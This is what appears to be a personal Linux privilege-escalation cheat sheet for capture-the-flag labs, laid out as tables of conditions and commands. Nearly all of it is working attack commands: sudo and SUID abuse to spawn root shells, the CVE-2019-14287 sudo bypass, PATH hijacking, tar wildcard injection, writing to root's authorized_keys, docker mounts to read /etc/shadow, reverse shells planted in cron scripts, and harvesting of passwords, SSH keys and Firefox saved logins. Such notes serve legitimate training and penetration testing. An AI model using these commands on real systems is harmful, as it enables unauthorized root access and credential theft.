### sudo -l → what can you run?

| Condition | Action |
|---|---|
| **tar** | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| **vi / vim** | `sudo vi -c ':!/bin/bash' /dev/null` |
| **perl + writable script** | Overwrite the script it calls |
| **NOPASSWD: ALL** | `sudo bash -i` |
| **!root quirk (CVE)** | `sudo -u \#$((0xffffffff)) /bin/bash` — `CVE-2019-14287` |
| **python3 runs a script** | Drop fake module in same dir |
| **sudo binary → PATH hijack** | 1. `strings /path/to/binary` → find relative command<br>2. `echo '/bin/sh' > /tmp/cmd && chmod +x /tmp/cmd`<br>3. `export PATH=/tmp:$PATH && sudo /path/to/binary` |
| **GPG encrypt-to-execute** | `find / -name "root@*.pub"` → import → encrypt command → run via wrapper *(Harder)* |

---

### Kernel / system CVE?

| Condition | Action |
|---|---|
| **Check kernel version** | `uname -a` |
| **Find exploit** | Search GitHub / ExploitDB / Google for `<version> privilege escalation` |
| **Deploy exploit** | wget to victim → `make` or `gcc exploit.c -o exploit` → run |

---

### SUID / custom binary?

| Condition | Action |
|---|---|
| **Find them** | `find / -user root -perm /4000 2>/dev/null` |
| **nmap** | `nmap --interactive` → `!sh` |
| **python / python2.7** | `python2.7 -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| **PATH hijacking (SUID)** | 1. `strings binary \| awk 'length($0) > 10'`<br>2. Create fake command + `chmod +x`<br>3. `export PATH=/writable/dir:$PATH` then run binary |
| **xxd (SUID)** | `echo 'ssh-key...' \| xxd \| /opt/xxd -r - /root/.ssh/authorized_keys` |
| **named binary + version** | Google name + version for public exploit |

---

### Linux Capabilities?

| Condition | Action |
|---|---|
| **Find them** | `getcap -r / 2>/dev/null` |
| **perl cap_setuid** | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'` |
| **python cap_setuid** | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| **Any binary** | Check GTFOBins "Capabilities" → gtfobins.github.io |

---

### Cron jobs / writable scripts?

| Condition | Action |
|---|---|
| **Find running jobs** | `pspy64` or `cat /etc/crontab` |
| **Writable called script** | Append reverse shell, wait for cron *(Startup, Archangel, All in One)* |
| **systemd timer** | Edit writable .timer, daemon-reload, trigger |
| **Tar wildcard injection** | • `echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh && chmod +x shell.sh`<br>• `echo "" > "--checkpoint=1"` · `echo "" > "--checkpoint-action=exec=sh shell.sh"` → wait → `/tmp/rootbash -p` |

---

### Special group membership?

| Condition | Action |
|---|---|
| **docker group** | Option 1 (mount): `docker run -v /etc/:/mnt -it alpine` → read /mnt/shadow etc<br>Option 2 (read root files directly): `cat /root/.ssh/id_rsa` inside container running as root<br>*Chillhack (mount), UltraTech (cat /root/.ssh/id_rsa)* |
| **adm group** | Read /var/log/* — may contain passwords |

---

### Lateral movement / other users?

| Condition | Action |
|---|---|
| **MySQL / phpMyAdmin** | `grep -r "password" /var/www/ 2>/dev/null` |
| **SSH key found** | `chmod 600 id_rsa && ssh -i id_rsa user@$IP` |
| **Firefox saved creds** | Method 1 — Manual: tar profile, SCP off, launch Firefox with `--profile`<br>Method 2 — Script: `python3 firefox_decrypt.py <profile_dir>/` |
| **grep logs / files** | `grep -iR username /home /var/log 2>/dev/null` |
| **password.txt in home** | Always `ls -la` the new user's home |
| **Check /opt/ for creds** | `ls /opt/ && cat /opt/*.txt` |
| **Cron/backup scripts** | `cat /etc/periodic/15min/* /etc/cron*/*` |

